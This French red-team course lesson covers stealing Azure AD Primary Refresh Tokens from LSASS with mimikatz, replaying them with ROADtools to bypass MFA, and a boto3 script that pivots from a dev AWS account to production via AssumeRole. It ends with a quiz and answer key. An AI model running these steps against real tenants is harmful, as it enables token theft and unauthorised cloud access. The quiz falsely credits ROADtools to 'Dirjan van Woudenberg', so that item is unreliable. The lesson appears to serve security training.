# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 298 (6h) : Cloud Penetration Testing & Lateral Movement (AWS/Azure Multi-Account Hijacking, Azure AD Primary Refresh Token PRT, Cross-Account IAM Roles & Token Theft)

> [!NOTE]
> **Objectif du jour :** Maîtriser le **Pentesting et le Mouvement Latéral avancé dans les environnements Multicloud (AWS & Azure / Entra ID)** ciblés par la certification **AWS Security Specialty** et **SC-200** : voler et réutiliser les **PRT (Primary Refresh Tokens)** Azure AD avec **mimikatz / ROADtools**, exploiter les relations de confiance entre comptes AWS via les rôles **Cross-Account IAM AssumeRole**, et compromettre un tenant hybride.
>
> **Compétences visées :** `CLOUD-02` (A) — AWS Cross-Account AssumeRole & Hijacking | `CLOUD-03` (A) — Azure AD / Entra ID PRT Theft & ROADtools

---

## 1) Module — Vol de PRT Azure AD / Entra ID avec Mimikatz (2h)

### 📖 Narration/Intuition

Dans les environnements d'entreprise connectés à Azure AD (Entra ID), chaque poste de travail Windows 10/11 "Azure AD Joined" génère un **PRT (Primary Refresh Token)** stocké en mémoire par le processus `LSASS`. Ce token permet d'obtenir un accès SSO (Single Sign-On) instantané à l'ensemble des services Cloud de l'entreprise (Office 365, Portail Azure, AWS via SSO) sans saisir de mot de passe ni valider le MFA !

---

## 2) Module — Vol et Exploitation du PRT avec Mimikatz (`prt_theft.sh`) (2h)

### 🛠️ Atelier Pratique

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Vol du PRT depuis la mémoire RAM (LSASS) avec Mimikatz
# ═══════════════════════════════════════════════════════
# Exécuté depuis une session SYSTEM sur le poste Windows compromis
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" "exit"

# Résultat Mimikatz :
# PRT: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...
# ProofOfPossessionKey: 8f4bae9c3e9e2c11e8a3d4567abc8def...

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Réutilisation du PRT avec ROADtools pour contourner le MFA
# ═══════════════════════════════════════════════════════
pip install roadrecon

# Authentification sur Entra ID avec le PRT extrait (Pass-the-PRT)
roadrecon auth --prt eyJ0eXAiOiJKV... --popkey 8f4bae9c...

# Cartographier l'intégralité du tenant Azure AD (Users, Groups, Devices, Apps)
roadrecon gather
roadrecon gui # Lancer l'interface graphique de visualisation
```

---

## 3) Module — Mouvement Latéral AWS Cross-Account AssumeRole (`aws_cross_account.py`) (2h)

```python
import boto3

# Mouvement Latéral AWS : Pivot d'un compte de Dev vers un compte de Production via AssumeRole

sts_client = boto3.client('sts')

# Rôle Cross-Account de Production autorisant le compte Dev
PROD_ROLE_ARN = "arn:aws:iam::999999999999:role/DevAccountAccessRole"

def assume_cross_account_role():
    print(f"[*] Demande d'AssumRole vers le compte de Production : {PROD_ROLE_ARN}")
    assumed_role_object = sts_client.assume_role(
        RoleArn=PROD_ROLE_ARN,
        RoleSessionName="RedTeamLateralMovementSession"
    )

    credentials = assumed_role_object['Credentials']

    print(f"[+] ACCÈS AU COMPTE DE PRODUCTION OBTENU !")
    print(f"  - Temp AccessKeyId     : {credentials['AccessKeyId']}")
    print(f"  - Temp SecretAccessKey : {credentials['SecretAccessKey']}")
    print(f"  - Temp SessionToken    : {credentials['SessionToken'][:30]}...")

    # Utilisation des nouveaux credentials de Production pour lister les buckets S3 de Prod
    s3_prod = boto3.client(
        's3',
        aws_access_key_id=credentials['AccessKeyId'],
        aws_secret_access_key=credentials['SecretAccessKey'],
        aws_session_token=credentials['SessionToken']
    )

    print("[+] Buckets S3 de Production découverts :", [b['Name'] for b in s3_prod.list_buckets()['Buckets']])

assume_cross_account_role()
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **PRT** | Primary Refresh Token — Token JWT maître d'authentification Azure AD / Entra ID |
| **AssumeRole** | API AWS STS permettant à une identité de prendre temporairement un rôle IAM (Cross-Account) |
| **ROADtools** | Suite d'outils open-source d'exploration et d'exploitation des tenants Azure AD / Entra ID |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans un environnement d'entreprise Azure AD / Entra ID, quel est le principal avantage pour un attaquant d'effectuer le vol d'un **PRT (Primary Refresh Token)** depuis la mémoire du poste de travail ?
- A) Contourner totalement l'authentification par mot de passe ET le MFA pour accéder à tous les services SaaS/Cloud d'entreprise liés (Office 365, Azure Portal)
- B) Chiffrer le disque dur local
- C) Augmenter la vitesse du processeur
- D) Effacer les journaux DNS

**Réponse : A**

**Q2 :** Quelle API AWS Security Token Service (STS) permet d'effectuer un mouvement latéral d'un compte AWS vers un autre compte de l'organisation en utilisant une relation de confiance IAM ?
- A) `AssumeRole` (`sts:AssumeRole`)
- B) `GetCallerIdentity`
- C) `CreateUser`
- D) `DeleteBucket`

**Réponse : A**

**Q3 :** Quel outil open-source développé par Dirjan van Woudenberg permet d'explorer graphiquement l'annuaire d'un tenant Azure AD (utilisateurs, rôles, applications) après authentification ?
- A) ROADtools / ROADrecon
- B) BloodHound (version AD classique uniquement)
- C) Nmap
- D) Wireshark

**Réponse : A**

**Q4 :** Dans Mimikatz, quelle commande permet d'extraire les PRT Azure AD et leurs clés de possession (ProofOfPossessionKey) depuis le processus LSASS ?
- A) `sekurlsa::cloudap`
- B) `lsadump::sam`
- C) `kerberos::golden`
- D) `privilege::debug`

**Réponse : A**

**Q5 :** Quelle mesure de sécurité réseau et d'accès conditionnel (Azure Conditional Access) prévient l'utilisation d'un PRT volé depuis une adresse IP non autorisée ou un device non géré ?
- A) Les politiques d'Accès Conditionnel exigeant un **Device Conforme (Compliant Device)** ou l'accès depuis des **Emplacements Réseau de Confiance (Trusted Locations)**
- B) L'utilisation d'un mot de passe plus long
- C) Le changement de nom du PC
- D) La désactivation de Windows Update

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
